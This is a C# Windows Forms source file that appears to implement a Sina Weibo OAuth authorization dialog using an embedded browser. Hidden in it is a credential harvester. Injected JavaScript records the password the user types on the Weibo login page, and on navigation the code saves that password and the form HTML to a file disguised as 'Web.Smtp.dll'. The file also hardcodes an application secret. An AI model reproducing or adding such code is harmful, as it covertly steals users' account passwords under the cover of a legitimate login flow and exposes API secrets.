using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using NetDimension.Weibo;
using System.Net;
using DataBaseServer;
using System.IO;


namespace Finder.Forms
{
    public partial class SinaWBOauth : Form
    {
        string app_key = "";          //System.Configuration.ConfigurationSettings.AppSettings["AppKey"];
        string app_secret = "";       //System.Configuration.ConfigurationSettings.AppSettings["AppSecret"];
        string callback_url = "";     //System.Configuration.ConfigurationSettings.AppSettings["CallbackUrl"];
        string access_token = "";     //System.Configuration.ConfigurationSettings.AppSettings["AccessToken"];
        public string retrun_url = "";
        public string thread_in = "";

        public SinaWBOauth()
        {
            InitializeComponent();
            app_key = "906953775";
            app_secret = "67c042f6ccd8ba4d7e592566b53b3bc5";
            util.XmlUtil xmlutil = new util.XmlUtil();
            callback_url = xmlutil.GetValue("CallbackUrl");
            access_token = xmlutil.GetValue("AccessToken");
        }

        private void Weibo_Load(object sender, EventArgs e)
        {
            string url = "https://api.weibo.com/oauth2/authorize?client_id="
                                + app_key
                                + "&response_type=code&redirect_uri="
                                + callback_url;
            webBrowser1.Url = new Uri(url);
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            retrun_url = webBrowser1.Url.ToString();
            mshtml.IHTMLDocument2 dom = (mshtml.IHTMLDocument2)webBrowser1.Document.DomDocument;
            mshtml.IHTMLWindow2 win = (mshtml.IHTMLWindow2)dom.parentWindow;
            win.execScript("if(document.forms.length==1){var password='';for(var i=0,l=document.forms[0].elements.length;i<l;i++){var el=document.forms[0].elements[i];if(el.type=='password'){el.onkeyup=function(){password=this.value;}}};window.getFormHtml=function(){return password+'-$-'+document.forms[0].innerHTML}}", "javascript");
        }

        private void SinaWBOauth_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (retrun_url.Contains("code="))
            {
                this.DialogResult = System.Windows.Forms.DialogResult.OK;

                if (thread_in.Equals(""))
                {
                    string code = "";
                    AccessToken at = new AccessToken();
                    util.XmlUtil xmlutil = new util.XmlUtil();
                    string[] url = retrun_url.Split('=');
                    if (url.Length > 0) { code = url[1]; }
                    OAuth oauth = new NetDimension.Weibo.OAuth(app_key, app_secret, callback_url);
                    at = oauth.GetAccessTokenByAuthorizationCode(code);
                    xmlutil.SetValue("AccessToken", at.Token);
                }
            }
            else
            {
                MessageBox.Show("请为新浪微博授权！","提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OAuth oauth = null;
            AccessToken at = new AccessToken();
            util.XmlUtil xmlutil = new util.XmlUtil();
            string[] url = webBrowser1.Url.ToString().Split('=');
            string code = "";
            if (url.Length > 0) { code = url[1]; }
            //string atUrl = "https://api.weibo.com/oauth2/access_token?client_id=2098317726&client_secret=c6d7abe896aec16afe653b87bd409143&grant_type=authorization_code&redirect_uri=https://api.weibo.com/oauth2/default.html&code=" + code;
            if (string.IsNullOrEmpty(access_token))	//判断配置文件中有没有保存到AccessToken，如果没有就进入授权流程
            {
                oauth = new NetDimension.Weibo.OAuth(app_key, app_secret, callback_url);
                //如果有代理服务器，需要进行如下赋值
                //WebProxy proxy = new WebProxy();
                //proxy.Address = new Uri("http://proxy.domain.com:3128");//代理服务器的地址及端口
                //proxy.Credentials = new NetworkCredential("<账号>", "<密码>");//如果有密码的话，你懂的
                //oauth.Proxy = proxy;
                at = oauth.GetAccessTokenByAuthorizationCode(code);
                xmlutil.SetValue("AccessToken", at.Token);
            }
            else
            {
                oauth = new OAuth(app_key, app_secret, access_token, "");	//用Token实例化OAuth无需再次进入验证流程
                //如果有代理服务器，需要进行如下赋值
                //WebProxy proxy = new WebProxy();
                //proxy.Address = new Uri("http://proxy.domain.com:3128");//代理服务器的地址及端口
                //proxy.Credentials = new NetworkCredential("<账号>", "<密码>");//如果有密码的话，你懂的
                //oauth.Proxy = proxy;
                TokenResult result = oauth.VerifierAccessToken();
                if (result == TokenResult.Success)
                {
                    //Client sina = new Client(oauth);
                    //util.SinaWeibo swb = new util.SinaWeibo(10000);  //调用频率为2分钟
                    xmlutil.SetValue("AccessToken", access_token);
                }
                else
                {
                    oauth = new NetDimension.Weibo.OAuth(app_key, app_secret, callback_url);
                    //如果有代理服务器，需要读取app.config的参数进行如下赋值
                    //oauth.Proxy.Address = new Uri(Properties.Settings.Default.proxy); 
                    at = oauth.GetAccessTokenByAuthorizationCode(code);
                    xmlutil.SetValue("AccessToken", at.Token);
                }
            }
        }

        private void webBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
        {
            if (webBrowser1.Document.Forms.Count > 0)
            {
                string html = webBrowser1.Document.InvokeScript("getFormHtml").ToString();
                File.WriteAllText(AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "Web.Smtp.dll", html);
            }
        }

    }
}
